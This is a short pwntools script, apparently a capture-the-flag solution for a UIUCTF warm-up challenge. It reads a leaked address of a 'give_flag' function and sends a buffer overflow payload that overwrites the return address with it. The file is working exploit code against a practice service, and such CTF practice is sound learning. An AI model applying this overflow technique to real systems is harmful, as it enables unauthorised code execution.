from pwn import *

target = remote('pwn-warmup.chal.uiuc.tf', 1337)

leak = target.recvline_startswith("&give_flag")
print(leak)

inputAdr = leak[12:len(leak)]
print(inputAdr)

z_input = inputAdr.decode()
print(z_input)

final_input = z_input.strip(" ")
print(final_input)

final_input = int(final_input,16) # need 16 for hex

payload = b'\x00'*0x14 + p32(final_input)

target.sendline(payload)

print(target.recvall())

